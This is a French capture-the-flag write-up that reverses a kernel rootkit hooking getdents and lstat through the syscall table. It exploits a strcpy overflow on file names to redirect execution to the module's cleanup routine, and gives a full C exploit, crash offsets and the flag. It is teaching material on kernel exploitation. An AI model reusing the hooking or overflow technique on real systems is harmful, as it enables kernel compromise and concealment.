# Hello Rootkitty - PWN - 500pts

> Une machine a été infectée par le rootkit Hello Rootkitty qui empêche la lecture de certains fichiers.

> Votre mission : aider la victime à récupérer le contenu des fichiers affectés. Une fois connecté en SSH, lancez le wrapper pour démarrer le challenge.

On continue sur la lancée des challenges kernel avec un challenge original impliquant un rootkit "empêchant la lecture de certains fichiers".
Ceci étant dit, démarrons sans plus attendre !

## Analyse du fonctionnement du rootkit

Dans un premier temps, on va faire une analyse préliminaire du fonctionnement du rootkit sur la machine, pour voir comment il "empêche la lecture" des fichiers.

On se connecte à la machine distante et effectuons un **ls -la** à la racine:

```
$ ls -la
total 4
drwxr-xr-x   14 root     root             0 Apr 30 23:25 .
drwxr-xr-x   14 root     root             0 Apr 30 23:25 ..
drwxr-xr-x    2 root     root             0 Feb 25 09:30 bin
drwxr-xr-x    3 root     root             0 Apr 30 23:25 dev
-r--------    0 root     root             0 Jan  0  1900 ecsc_flag_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
drwxr-xr-x    2 root     root             0 Apr 30 23:25 etc
drwxr-xr-x    3 root     root             0 Feb 25 09:30 home
----------    1 root     root          2085 Feb 25 10:45 init
drwxr-xr-x    3 root     root             0 Feb 25 09:30 lib
drwxr-xr-x    3 root     root             0 Apr 30 23:25 mnt
dr-xr-xr-x   28 root     root             0 Apr 30 23:25 proc
drwx------    2 root     root             0 Feb 14 15:41 root
drwxr-xr-x    2 root     root             0 Apr 30 23:25 run
dr-xr-xr-x   10 root     root             0 Apr 30 23:25 sys
drwxr-xr-x    2 root     root             0 Apr 30 23:25 tmp
drwxr-xr-x    3 root     root             0 Apr 30 23:25 var
```

Hmm, le fichier qui devait être le flag à l'air totalement modifié, son timestamp est mis à 0, sa taille est nulle et son nom est rempli de "X", devant cacher le nom entier du fichier.
De plus, il est seulement lisible par root en lecture ... Satané rootkit !

On remarque cependant que les autres fichiers n'ont pas l'air d'être touchés.

Il va falloir percer les mystères de ce module en allant fouiller dans le code ce celui-ci !

## Reverse du module kernel

Le module kernel "ecsc.ko" nous est fourni, on ouvre notre outil favori (pour ma part Ghidra) afin de découvrir ce qu'il se cache dedans.

À première vue, nous avons 5 fonctions principales:

* init_module
* ecsc_sys_getdents
* ecsc_sys_getdents64
* ecsc_sys_lstat
* cleanup_module

### init_module

Voici dans un premier temps le pseudocode généré par Ghidra:

```c

undefined8 init_module(void)

{
  long syscall_table;
  undefined8 in_CR0;
  
  syscall_table = kallsyms_lookup_name("sys_call_table");
  ref_sys_getdents64 = *(undefined8 *)(syscall_table + 0x6c8);
  original_cr0 = in_CR0;
  my_sys_call_table = syscall_table;
  *(undefined8 *)(syscall_table + 0x6c8) = 0x100030;
  ref_sys_getdents = *(undefined8 *)(syscall_table + 0x270);
  *(undefined8 *)(syscall_table + 0x270) = 0x100180;
  ref_sys_lstat = *(undefined8 *)(syscall_table + 0x30);
  *(undefined8 *)(syscall_table + 0x30) = 0x1002d0;
  return 0;
}
```

Le module semble remplacer les fonctions associés aux syscalls **getdents**,**getdents64** et **lstat** par des fonctions internes au module, qui sont respectivement **ecsc_sys_getdents**, **ecsc_sys_getdents64**, et **ecsc_sys_lstat**.

Ceci expliquerait le résultat étrange de notre ls.

### ecsc_sys_lstat

```c
  pcVar1 = strstr(filename,"ecsc_flag_");
  if (pcVar1 == (char *)0x0) {
    uVar2 = (*ref_sys_lstat)(filename,statbuf);
    return uVar2;
  }
```

Dans un premier temps, la fonction check si la chaîne "ecsc_flag_" est contenue dans le nom du fichier.
Si ce n'est pas le cas, l'appel système lstat est exécuté normalement.

En revanche, si la chaîne est contenue dans le nom du fichier, ça se corse.

```c
  statbuf->st_dev = 0;
  statbuf->__pad1 = 0;
  statbuf->st_ino = 0;
  statbuf->st_mode = 0100400;
  statbuf->st_uid = 0;
  statbuf->st_rdev = 0;
  statbuf->__pad2 = 0;
  do_gettimeofday(&local_28);
  if (local_28 < 0x225c17d04) {
    lVar3 = local_28 * 1000000000 + local_20 * 1000;
  }
  else {
    lVar3 = 0x7fffffffffffffff;
  }
  statbuf->st_blocks = lVar3;
  (statbuf->st_atim).tv_nsec = lVar3;
  (statbuf->st_mtim).tv_nsec = lVar3;
  statbuf->st_size = 0;
  statbuf->st_blksize = 0;
```

Pas mal de champs de la structure **stat** sont modifiés, notamment la taille, le timestamp, le propriétaire, les permissions ...
Ça explique ce qu'on a repéré dans l'analyse préliminaire.

À part ça rien de bien méchant, il se contente juste de modifier ces infos.

### ecsc_sys_getdents / ecsc_sys_getdents64

Ah là on s'attaque au vif du sujet ! 
Je vous épargne le pseudocode que Ghidra génère qui est assez long et assez complexe.

Mais on peut résumer en regardant le code et en faisant des tests sur la machine distante que:

* Sur le même principe que lstat, seulement les fichiers contenant "ecsc_flag_" sont impactés
* Les caractères après "ecsc_flag_" sont remplacés par des "X"

On remarque cependant deux appels à **strcpy**, avec en buffer source le nom du fichier (que nous pouvons contrôler !).
Ça sent le buffer overflow à plein nez !

On va essayer de confirmer tout ça en fuzzant légèrement le module kernel.

### cleanup_module

```c
void cleanup_module(undefined8 param_1,undefined8 param_2)

{
	undefined8 uVar1;
	long lVar2;

	lVar2 = my_sys_call_table;
	uVar1 = original_cr0;
	*(undefined8 *)(my_sys_call_table + 0x6c8) = ref_sys_getdents64;
	*(undefined8 *)(lVar2 + 0x270) = ref_sys_getdents;
	*(undefined8 *)(lVar2 + 0x30) = ref_sys_lstat;
	msleep(2000,param_2,uVar1);
	return;
}
```

Cette fonction assez similaire à **init_module** va simplement rétablir les fonctions par défaut des différents appels systèmes affectés.

## Recherche de vulnérabilité

Suite à l'analyse statique du module, on a pu réperer une potentielle vulnérabilité de buffer overflow présente dans la fonction remplaçant le syscall "**getdents** / **getdents64**".

Nous allons donc créer un fichier de nom "ecsc_flag_" avec un pattern reconnaissable pour déterminer l'offset des différents éléments qu'on pourrait écraser.

Au hasard: ```AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ```

On crée donc ce fichier, puis on exécute un **ls** pour trigger le syscall getdents.

Boum, un kernel panic quel plaisir.

```
general protection fault: 0000 [#1] NOPTI
Modules linked in: ecsc(O)
CPU: 0 PID: 53 Comm: ls Tainted: G           O    4.14.167 #11
task: ffff9ca6c2219100 task.stack: ffffa34c4009c000
RIP: 0010:0x4e4e4e4e4e4e4d4d
RSP: 0018:ffffa34c4009ff38 EFLAGS: 00000282
RAX: 0000000000000120 RBX: 4a4a4a4a4a4a4949 RCX: 0000000000000000
RDX: 00007ffd5d9a678e RSI: ffffa34c4009ff9b RDI: 00007ffd5d9a66b3
RBP: 4d4d4d4d4d4d4c4c R08: ffffa34c4009fed0 R09: ffffffffc03e0024
R10: ffffa34c4009fec0 R11: 5858585757575757 R12: 4b4b4b4b4b4b4a4a
R13: 4c4c4c4c4c4c4b4b R14: 0000000000000000 R15: 0000000000000000
FS:  0000000000000000(0000) GS:ffffffffb5036000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00000000018c2138 CR3: 00000000022a6000 CR4: 00000000000006b0
Call Trace:
Code:  Bad RIP value.
RIP: 0x4e4e4e4e4e4e4d4d RSP: ffffa34c4009ff38
---[ end trace 717bbb6220987e42 ]---
Kernel panic - not syncing: Fatal exception
Kernel Offset: 0x33600000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
```

On peut voir qu'on écrase pas mal de registres: **RBX**, **R12**, **R13**, **RBP**, et le meilleur pour la fin **RIP** !
Grâce à notre pattern reconnaissable, on peut déterminer l'offset de chacun des registres:

* RBX: Offset 70
* R12: Offset 78
* R13: Offset 86
* RBP: Offset 94
* RIP: Offset 102

Super, on peut contrôler le flux d'exécution du module kernel !
Mais que peut-on faire avec ?

## Exploitation du buffer overflow

Au début, dans l'euphorie je m'étais mis en tête d'obtenir un shell root en appelant ```commit_creds(prepare_kernel_cred(0))```, puis en exécutant un shell dans notre exploit.

On énumère les protections activées sur le système:

* SMEP off
* KASLR on

Mais rappelons-nous d'abord l'objectif principal du challenge:
> Votre mission : aider la victime à récupérer le contenu des fichiers affectés. Une fois connecté en SSH, lancez le wrapper pour démarrer le challenge.

On doit récupérer le contenu des fichiers affectés, donc pas besoin d'un shell root. 
Il est seulement nécessaire de faire en sorte de désactiver ce maudit rootkit.

Wait a minute ...
La fonction **cleanup_module** fait tout ce travail à notre place !
Pourquoi ne pas rediriger le flux d'exécution vers cette fonction ?

C'est parti, on fabrique un petit exploit qui va faire ce travail pour nous !

Un petit résumé du plan de l'exploitation:

1. Créer un fichier commençant par **ecsc_flag_** suivi de notre payload (102 caractères de padding).
2. Ajouter l'adresse de **cleanup_module**.
3. Ajouter une adresse de retour pour sortir sans que le kernel crash: **sys_exit** fera l'affaire.
4. Appeler l'appel système **getdents** pour déclencher l'overflow et désactiver le rootkit.

On peut récupérer l'adresse des différentes fonctions avec /proc/kallsyms:

```bash
cat /proc/kallsyms | grep "cleanup_module"
cat /proc/kallsyms | grep "sys_exit"
```

On obtient (adresses valide jusqu'à un prochain redémarrage du noyau, à cause de KASLR):

```
cleanup_module @ ffffffffc02df36e
sys_exit @ ffffffffa40390f0
```

On code tout ça, ce qui nous donne:

(Excusez-moi à l'avance pour la non propreté de ce code)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/syscall.h>

#define RIP_OFFSET 102

// cleanup_module @ ffffffffc02df36e
// sys_exit @ ffffffff9a63a390

int main(void) {
	FILE *file;
	char filename[1024];
	char buf[256];

	strncpy(filename, "ecsc_flag_", sizeof(filename) - 1);
	for(int i = 0; i < RIP_OFFSET; i++) filename[strlen(filename)] = 'A';

	strncat(filename, "\x6e\xf3\x2d\xc0\xff\xff\xff\xff", sizeof(filename) - 1);
	strncat(filename, "\x90\xa3\x63\x9a\xff\xff\xff\xff", sizeof(filename) - 1);
	
	file = fopen(filename, "w");
	fclose(file);

	int dirfd = open(".", O_RDONLY);
	syscall(SYS_getdents, dirfd, buf, sizeof(buf));

	return 0;
}
```

On compile notre exploit et on l'upload sur la machine distante:
On n'oublie pas le flag **static** sur gcc pour pas avoir de problèmes avec les liens dynamiques.

```bash
gcc -static exploit.c -o exploit
```

## Récupération du flag

Il ne nous reste plus qu'à exécuter notre exploit et à réessayer le **ls -la** à la racine:

``` 
$ ls -la
total 8
drwxr-xr-x   14 root     root             0 May  1 01:24 .
drwxr-xr-x   14 root     root             0 May  1 01:24 ..
drwxr-xr-x    2 root     root             0 Feb 25 09:30 bin
drwxr-xr-x    3 root     root             0 May  1 01:24 dev
-r--r--r--    1 root     root            71 May  1 01:24 ecsc_flag_cf785ee0b5944f93dd09bf1b1b2c6da7fadada8e4d325a804d1dde2116676126
drwxr-xr-x    2 root     root             0 May  1 01:24 etc
drwxr-xr-x    3 root     root             0 Feb 25 09:30 home
----------    1 root     root          2085 Feb 25 10:45 init
drwxr-xr-x    3 root     root             0 Feb 25 09:30 lib
drwxr-xr-x    3 root     root             0 May  1 01:24 mnt
dr-xr-xr-x   28 root     root             0 May  1 01:24 proc
drwx------    2 root     root             0 Feb 14 15:41 root
drwxr-xr-x    2 root     root             0 May  1 01:24 run
dr-xr-xr-x   10 root     root             0 May  1 01:24 sys
drwxr-xr-x    2 root     root             0 May  1 01:24 tmp
drwxr-xr-x    3 root     root             0 May  1 01:24 var
``` 

Nickel, on a bien désactivé le rootkit et on peut voir le flag tel quel !

FLAG: ECSC{c0d801fb2045ddb0ab27766e52b7654ccde41b5fc00d07fa908fefa30b45b8a5}